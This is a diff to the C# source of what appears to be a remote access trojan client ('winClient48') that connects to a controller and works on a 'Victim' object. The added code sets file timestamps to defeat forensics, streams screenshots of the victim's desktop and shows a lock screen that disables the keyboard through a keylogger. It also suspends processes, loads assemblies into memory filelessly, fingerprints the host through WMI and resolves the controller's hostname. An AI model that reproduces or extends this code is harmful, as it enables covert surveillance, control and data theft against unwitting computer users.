@@ -56,8 +56,6 @@ namespace winClient48
 
         public Form1(string[] args)
         {
-            m_args = args;
-
             InitializeComponent();
         }
 
@@ -600,6 +598,7 @@ namespace winClient48
 
                 #endregion
                 #region FileMgr
+
                 else if (cmd[0] == "file")
                 {
                     if (funcFile == null)
@@ -840,7 +839,19 @@ namespace winClient48
 
                         v.SendCommand($"file|wget|status|{cmd[2]}|{Crypto.b64E2Str(x.Item3)}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                     }
+                    else if (cmd[1] == "ts")
+                    {
+                        bool bIsFile = cmd[2] == "1";
+                        string szFilePath = Crypto.b64D2Str(cmd[3]);
+                        EntityTimestampType etType = (EntityTimestampType)int.Parse(cmd[4]);
+                        DateTime time = DateTime.Parse(Crypto.b64D2Str(cmd[5]));
+
+                        var x = funcFile.fnSetEntityTimestamp(bIsFile, szFilePath, etType, time);
+
+                        v.SendCommand($"file|ts|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
+                    }
                 }
+
                 #endregion
                 #region TaskMgr
                 else if (cmd[0] == "task")
@@ -1322,7 +1333,7 @@ namespace winClient48
                         }
                         else
                         {
-                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + ScreenShot(v, device_name, width, height) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
+                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + Global.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
                         }
                     }
                     else if (cmd[1] == "stop")
@@ -1619,16 +1630,21 @@ namespace winClient48
                                         f_lock = new frmLockScreen();
                                         f_lock.Tag = v;
                                         f_lock.Show();
+
                                         f_lock.Focus();
                                         f_lock.BringToFront();
                                         f_lock.Location = new Point(screen.Bounds.Left, screen.Bounds.Top);
                                         f_lock.WindowState = FormWindowState.Maximized;
                                         f_lock.ShowImage(cmd[3]);
+
                                         l_frmLockScreen.Add(f_lock);
 
                                         WinAPI.SetForegroundWindow(f_lock.Handle);
                                     }
                                 }));
+
+                                Cursor.Hide();
+                                keylogger.disable_keyboard = true;
                             }
                             else
                             {
@@ -1636,6 +1652,9 @@ namespace winClient48
                                 {
                                     f.ShowImage(cmd[3]);
                                 }
+
+                                Cursor.Show();
+                                keylogger.disable_keyboard = false;
                             }
 
                             //Disable keyboard and mouse.
@@ -1703,6 +1722,11 @@ namespace winClient48
                         {
                             string BooleanToString(bool bValue) => bValue ? "True" : "False";
 
+                            bool bMouseVisible = funcFun.bMouseVisible;
+                            bool bMouseCrazy = funcFun.m_bMouseCrazy;
+                            bool bMouseLock = funcFun.m_bMouseLock;
+                            bool bMouseTrail = funcFun.m_bMouseTrail;
+
                             bool bHideTray = funcFun.bHideTray;
                             bool bHideDesktopIcon = funcFun.bHideDesktopIcon;
                             bool bHideClock = funcFun.bHideClock;
@@ -1720,11 +1744,20 @@ namespace winClient48
 
                                 string.Join(",", new string[]
                                 {
+                                    //Mouse
+                                    "MouseVisible:" + BooleanToString(bMouseVisible),
+                                    "MouseCrazy:" + BooleanToString(bMouseCrazy),
+                                    "MouseLock:" + BooleanToString(bMouseLock),
+                                    "MouseTrail:" + BooleanToString(bMouseTrail),
+
+                                    //HWND
                                     "HideTray:" + BooleanToString(bHideTray),
                                     "HideDesktopIcon:" + BooleanToString(bHideDesktopIcon),
                                     "HideClock:" + BooleanToString(bHideClock),
                                     "HideStartOrb:" + BooleanToString(bHideStartOrb),
                                     "HideTaskbar:" + BooleanToString(bHideTray),
+
+                                    //Keyboard
                                     "KeySmile:" + BooleanToString(bKeySmile),
                                     "KeyDisable:" + BooleanToString(bKeyDisable),
                                 }),
@@ -1768,7 +1801,9 @@ namespace winClient48
 
                 else if (cmd[0] == "thread")
                 {
-                    uint nThreadID = uint.Parse(cmd[2]);
+                    int nProcID = int.Parse(cmd[2]);
+                    Process proc = Process.GetProcessById(nProcID);
+                    uint nThreadID = (uint)proc.Threads[0].Id;
                     IntPtr hThread = WinAPI.OpenThread(WinAPI.THREAD_SUSPEND_RESUME, false, nThreadID);
 
                     if (hThread == IntPtr.Zero)
@@ -2123,11 +2158,15 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
+                    MessageBox.Show("A");
+
                     string[] alpArgs = cmd[1].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                     byte[] abAssembly = Convert.FromBase64String(cmd[2]);
                     abAssembly = clsEZData.abGzipDecompress(abAssembly);
 
                     installer.fnLoadToMemory(alpArgs, abAssembly);
+
+                    MessageBox.Show("B");
                 }
 
                 #endregion
@@ -2172,6 +2211,45 @@ namespace winClient48
             }
             return string.Join(",", result.ToArray());
         }
+        private DataTable fnWmiQuery(string szQuery)
+        {
+            DataTable dt = new DataTable();
+            try
+            {
+                using (var search = new ManagementObjectSearcher(szQuery))
+                {
+                    using (var coll = search.Get())
+                    {
+                        bool bCollAdded = false;
+                        foreach (ManagementObject obj in coll)
+                        {
+                            if (!bCollAdded)
+                            {
+                                foreach (PropertyData prop in obj.Properties)
+                                    dt.Columns.Add(prop.Name.ToString());
+
+                                bCollAdded = true;
+                            }
+
+                            DataRow dr = dt.NewRow();
+                            foreach (PropertyData prop in obj.Properties)
+                                dr[prop.Name] = prop.Value ?? DBNull.Value;
+
+                            dt.Rows.Add(dr);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                dt.Columns.Add("Err");
+                DataRow dr = dt.NewRow();
+                dr["Err"] = ex.Message;
+                dt.Rows.Add(dr);
+            }
+
+            return dt;
+        }
         /// <summary>
         /// 
         /// </summary>
@@ -2210,16 +2288,15 @@ namespace winClient48
         /// <param name="width"></param>
         /// <param name="height"></param>
         /// <returns></returns>
-        string ScreenShot(Victim v, string device_name, int width, int height)
+        Bitmap fnScreenShot(Victim v, string device_name, int width, int height)
         {
             int idx = FindDesktopIndex(device_name);
             Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
             Rectangle capture_rect = Screen.AllScreens[idx].Bounds;
             Graphics capture_graphics = Graphics.FromImage(bitmap);
             capture_graphics.CopyFromScreen(capture_rect.Left, capture_rect.Top, 0, 0, capture_rect.Size);
-            string b64_image = Global.BitmapToBase64(bitmap);
-
-            return b64_image;
+            
+            return bitmap;
         }
         /// <summary>
         /// Start remote desktop live.
@@ -2232,7 +2309,8 @@ namespace winClient48
         {
             while (is_connected && send_screenshot)
             {
-                string b64_img = ScreenShot(v, device_name, width, height);
+                Bitmap bmp = fnScreenShot(v, device_name, width, height);
+                string b64_img = Global.BitmapToBase64(bmp);
                 v.encSend(2, 0, "desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                 Thread.Sleep(m_nDesktopDelay);
             }
@@ -2298,7 +2376,7 @@ namespace winClient48
                         Screen.AllScreens.Length.ToString(), //MONITOR
                         new Webcam().GetDevices().Count.ToString(), //WEBCAM
                         Crypto.b64E2Str(Global.GetActiveWindowTitle()),
-                        send_screen ? ScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height) : string.Empty,
+                        send_screen ? Global.BitmapToBase64(fnScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height)) : string.Empty,
                     };
 
                     string info = string.Join("|", info_array);
@@ -2340,6 +2418,20 @@ namespace winClient48
         {
             try
             {
+                if (!IPAddress.TryParse(ip, out var address))
+                {
+                    try
+                    {
+                        IPAddress[] aAddr = Dns.GetHostAddresses(ip);
+                        if (aAddr.Length > 0)
+                            ip = aAddr[0].ToString();
+                    }
+                    catch
+                    {
+
+                    }
+                }
+
                 Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 socket.Connect(ip, port);
                 Victim v = new Victim(socket);
@@ -2367,8 +2459,12 @@ namespace winClient48
 
                 installer.Start();
 
+                /*
                 string[] id_array = Global.WMI_QueryNoEncode("select serialnumber from win32_diskdrive");
                 string szSerialNumber = id_array[0].Replace(" ", string.Empty).Trim();
+                */
+                DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
+                string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();
 
                 clntConfig = new ClientConfig()
                 {
